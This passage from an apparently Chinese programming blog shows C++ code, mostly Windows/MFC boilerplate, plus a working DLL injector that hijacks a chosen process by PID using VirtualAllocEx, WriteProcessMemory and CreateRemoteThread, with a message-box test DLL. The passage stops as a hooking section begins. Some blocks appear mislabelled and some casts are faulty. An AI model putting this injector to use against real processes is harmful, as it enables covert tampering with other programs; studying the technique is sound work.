class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// AutoRunImmunity.cpp: 定义应用程序的类行为。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;AutoRunImmunity.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;AutoRunImmunityDlg.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> new DEBUG_NEW</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CAutoRunImmunityApp</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">BEGIN_MESSAGE_MAP</span>(CAutoRunImmunityApp, CWinApp)</span><br><span class="line"><span class="built_in">ON_COMMAND</span>(ID_HELP, &amp;CWinApp::OnHelp)</span><br><span class="line"><span class="built_in">END_MESSAGE_MAP</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CAutoRunImmunityApp 构造</span></span><br><span class="line"></span><br><span class="line">CAutoRunImmunityApp::<span class="built_in">CAutoRunImmunityApp</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 支持重新启动管理器</span></span><br><span class="line">m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处添加构造代码，</span></span><br><span class="line"><span class="comment">// 将所有重要的初始化放置在 InitInstance 中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 唯一的 CAutoRunImmunityApp 对象</span></span><br><span class="line"></span><br><span class="line">CAutoRunImmunityApp theApp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CAutoRunImmunityApp 初始化</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CAutoRunImmunityApp::InitInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 如果一个运行在 Windows XP 上的应用程序清单指定要</span></span><br><span class="line"><span class="comment">// 使用 ComCtl32.dll 版本 6 或更高版本来启用可视化方式，</span></span><br><span class="line"><span class="comment">//则需要 InitCommonControlsEx()。  否则，将无法创建窗口。</span></span><br><span class="line">INITCOMMONCONTROLSEX InitCtrls;</span><br><span class="line">InitCtrls.dwSize = <span class="built_in">sizeof</span>(InitCtrls);</span><br><span class="line"><span class="comment">// 将它设置为包括所有要在应用程序中使用的</span></span><br><span class="line"><span class="comment">// 公共控件类。</span></span><br><span class="line">InitCtrls.dwICC = ICC_WIN95_CLASSES;</span><br><span class="line"><span class="built_in">InitCommonControlsEx</span>(&amp;InitCtrls);</span><br><span class="line"></span><br><span class="line">CWinApp::<span class="built_in">InitInstance</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">AfxEnableControlContainer</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 shell 管理器，以防对话框包含</span></span><br><span class="line"><span class="comment">// 任何 shell 树视图控件或 shell 列表视图控件。</span></span><br><span class="line">CShellManager *pShellManager = <span class="keyword">new</span> CShellManager;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 激活“Windows Native”视觉管理器，以便在 MFC 控件中启用主题</span></span><br><span class="line">CMFCVisualManager::<span class="built_in">SetDefaultManager</span>(<span class="built_in">RUNTIME_CLASS</span>(CMFCVisualManagerWindows));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 标准初始化</span></span><br><span class="line"><span class="comment">// 如果未使用这些功能并希望减小</span></span><br><span class="line"><span class="comment">// 最终可执行文件的大小，则应移除下列</span></span><br><span class="line"><span class="comment">// 不需要的特定初始化例程</span></span><br><span class="line"><span class="comment">// 更改用于存储设置的注册表项</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 应适当修改该字符串，</span></span><br><span class="line"><span class="comment">// 例如修改为公司或组织名</span></span><br><span class="line"><span class="built_in">SetRegistryKey</span>(_T(<span class="string">&quot;应用程序向导生成的本地应用程序&quot;</span>));</span><br><span class="line"></span><br><span class="line">CAutoRunImmunityDlg dlg;</span><br><span class="line">m_pMainWnd = &amp;dlg;</span><br><span class="line">INT_PTR nResponse = dlg.<span class="built_in">DoModal</span>();</span><br><span class="line"><span class="keyword">if</span> (nResponse == IDOK)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此放置处理何时用</span></span><br><span class="line"><span class="comment">//  “确定”来关闭对话框的代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (nResponse == IDCANCEL)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此放置处理何时用</span></span><br><span class="line"><span class="comment">//  “取消”来关闭对话框的代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (nResponse == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(traceAppMsg, <span class="number">0</span>, <span class="string">&quot;警告: 对话框创建失败，应用程序将意外终止。\n&quot;</span>);</span><br><span class="line"><span class="built_in">TRACE</span>(traceAppMsg, <span class="number">0</span>, <span class="string">&quot;警告: 如果您在对话框上使用 MFC 控件，则无法 #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS。\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除上面创建的 shell 管理器。</span></span><br><span class="line"><span class="keyword">if</span> (pShellManager != <span class="literal">nullptr</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> pShellManager;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined(_AFXDLL) &amp;&amp; !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS)</span></span><br><span class="line"><span class="built_in">ControlBarCleanUp</span>();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于对话框已关闭，所以将返回 FALSE 以便退出应用程序，</span></span><br><span class="line"><span class="comment">//  而不是启动应用程序的消息泵。</span></span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="dll注入"><a class="markdownIt-Anchor" href="#dll注入"></a> DLL注入</h2><h4 id="dll_helloworld"><a class="markdownIt-Anchor" href="#dll_helloworld"></a> DLL_Helloworld</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MaxLen = <span class="number">0x50</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//extern &quot;C&quot; __declspec(dllexport) </span></span><br><span class="line"><span class="comment">//VOID MsgBox(wchar_t*szMsg)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    wchar_t szModuleName[MaxLen];</span></span><br><span class="line"><span class="comment">//    GetModuleFileName(NULL, szModuleName, MaxLen);</span></span><br><span class="line"><span class="comment">//    MessageBox(NULL,szMsg,szModuleName,MB_OK);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">MsgBox</span><span class="params">(<span class="type">wchar_t</span>* szMsg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">wchar_t</span> szModuleName[MaxLen];</span><br><span class="line">    <span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, szModuleName, MaxLen);</span><br><span class="line">    <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>, szMsg, szModuleName, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule, <span class="comment">//DLL模块句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,<span class="comment">//被调用原因</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved <span class="comment">//保留想，傻逼windows</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span><span class="comment">//入口函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;HI&quot;</span>, <span class="string">&quot;Attached&quot;</span>, MB_OK);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MsgBox</span>((<span class="type">wchar_t</span>*)<span class="string">&quot;Thread attached&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="dll注入-2"><a class="markdownIt-Anchor" href="#dll注入-2"></a> DLL注入</h4><p><strong>注入器</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MaxLen = <span class="number">0x50</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> DllPath[MaxLen];</span><br><span class="line">    DWORD PID;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Which DLL To Load?\n&quot;</span>;</span><br><span class="line">    cin &gt;&gt; DllPath;</span><br><span class="line">    <span class="keyword">if</span> (DllPath == <span class="literal">NULL</span>)</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;This Dll Not exsits\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; DllPath &lt;&lt; endl;</span><br><span class="line">    <span class="comment">//LoadLibraryA((LPCSTR)DllPath);</span></span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Which Program want to hijack?\n&quot;</span>;</span><br><span class="line">    cin &gt;&gt; PID;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS,FALSE,PID);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;This process is missing\n&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> DllLen = <span class="built_in">strlen</span>(DllPath) + <span class="built_in">sizeof</span>(<span class="type">char</span>);</span><br><span class="line"></span><br><span class="line">    PVOID pDllAddr = <span class="built_in">VirtualAllocEx</span>(</span><br><span class="line">        hProcess,<span class="literal">NULL</span>,DllLen,MEM_COMMIT,PAGE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (pDllAddr == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Handle ERROR\n&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD dwWriteNum = <span class="number">0</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Writting Mem\n&quot;</span>;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(</span><br><span class="line">        hProcess, pDllAddr, DllPath, DllLen, &amp;dwWriteNum</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;GetProcAddr\n&quot;</span>;</span><br><span class="line">    FARPROC pFunAddr = <span class="built_in">GetProcAddress</span>(</span><br><span class="line">        <span class="built_in">GetModuleHandle</span>((LPCWSTR)<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;CreateRemoteThread\n&quot;</span>;</span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(</span><br><span class="line">        hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pFunAddr, pDllAddr, <span class="number">0</span>, <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Close Handles\n&quot;</span>;</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread,INFINITE);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>待注入DLL</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Injector.cpp: 定义应用程序的类行为。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Injector.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;InjectorDlg.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> new DEBUG_NEW</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CInjectorApp</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">BEGIN_MESSAGE_MAP</span>(CInjectorApp, CWinApp)</span><br><span class="line"><span class="built_in">ON_COMMAND</span>(ID_HELP, &amp;CWinApp::OnHelp)</span><br><span class="line"><span class="built_in">END_MESSAGE_MAP</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CInjectorApp 构造</span></span><br><span class="line"></span><br><span class="line">CInjectorApp::<span class="built_in">CInjectorApp</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 支持重新启动管理器</span></span><br><span class="line">m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处添加构造代码，</span></span><br><span class="line"><span class="comment">// 将所有重要的初始化放置在 InitInstance 中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 唯一的 CInjectorApp 对象</span></span><br><span class="line"></span><br><span class="line">CInjectorApp theApp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CInjectorApp 初始化</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CInjectorApp::InitInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 如果一个运行在 Windows XP 上的应用程序清单指定要</span></span><br><span class="line"><span class="comment">// 使用 ComCtl32.dll 版本 6 或更高版本来启用可视化方式，</span></span><br><span class="line"><span class="comment">//则需要 InitCommonControlsEx()。  否则，将无法创建窗口。</span></span><br><span class="line">INITCOMMONCONTROLSEX InitCtrls;</span><br><span class="line">InitCtrls.dwSize = <span class="built_in">sizeof</span>(InitCtrls);</span><br><span class="line"><span class="comment">// 将它设置为包括所有要在应用程序中使用的</span></span><br><span class="line"><span class="comment">// 公共控件类。</span></span><br><span class="line">InitCtrls.dwICC = ICC_WIN95_CLASSES;</span><br><span class="line"><span class="built_in">InitCommonControlsEx</span>(&amp;InitCtrls);</span><br><span class="line"></span><br><span class="line">CWinApp::<span class="built_in">InitInstance</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">AfxEnableControlContainer</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 shell 管理器，以防对话框包含</span></span><br><span class="line"><span class="comment">// 任何 shell 树视图控件或 shell 列表视图控件。</span></span><br><span class="line">CShellManager *pShellManager = <span class="keyword">new</span> CShellManager;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 激活“Windows Native”视觉管理器，以便在 MFC 控件中启用主题</span></span><br><span class="line">CMFCVisualManager::<span class="built_in">SetDefaultManager</span>(<span class="built_in">RUNTIME_CLASS</span>(CMFCVisualManagerWindows));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 标准初始化</span></span><br><span class="line"><span class="comment">// 如果未使用这些功能并希望减小</span></span><br><span class="line"><span class="comment">// 最终可执行文件的大小，则应移除下列</span></span><br><span class="line"><span class="comment">// 不需要的特定初始化例程</span></span><br><span class="line"><span class="comment">// 更改用于存储设置的注册表项</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 应适当修改该字符串，</span></span><br><span class="line"><span class="comment">// 例如修改为公司或组织名</span></span><br><span class="line"><span class="built_in">SetRegistryKey</span>(_T(<span class="string">&quot;应用程序向导生成的本地应用程序&quot;</span>));</span><br><span class="line"></span><br><span class="line">CInjectorDlg dlg;</span><br><span class="line">m_pMainWnd = &amp;dlg;</span><br><span class="line">INT_PTR nResponse = dlg.<span class="built_in">DoModal</span>();</span><br><span class="line"><span class="keyword">if</span> (nResponse == IDOK)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此放置处理何时用</span></span><br><span class="line"><span class="comment">//  “确定”来关闭对话框的代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (nResponse == IDCANCEL)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此放置处理何时用</span></span><br><span class="line"><span class="comment">//  “取消”来关闭对话框的代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (nResponse == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(traceAppMsg, <span class="number">0</span>, <span class="string">&quot;警告: 对话框创建失败，应用程序将意外终止。\n&quot;</span>);</span><br><span class="line"><span class="built_in">TRACE</span>(traceAppMsg, <span class="number">0</span>, <span class="string">&quot;警告: 如果您在对话框上使用 MFC 控件，则无法 #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS。\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除上面创建的 shell 管理器。</span></span><br><span class="line"><span class="keyword">if</span> (pShellManager != <span class="literal">nullptr</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> pShellManager;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined(_AFXDLL) &amp;&amp; !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS)</span></span><br><span class="line"><span class="built_in">ControlBarCleanUp</span>();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于对话框已关闭，所以将返回 FALSE 以便退出应用程序，</span></span><br><span class="line"><span class="comment">//  而不是启动应用程序的消息泵。</span></span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hook编程进程hook"><a class="markdownIt-Anchor" href="#hook编程进程hook"></a> Hook编程（进程Hook）</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span 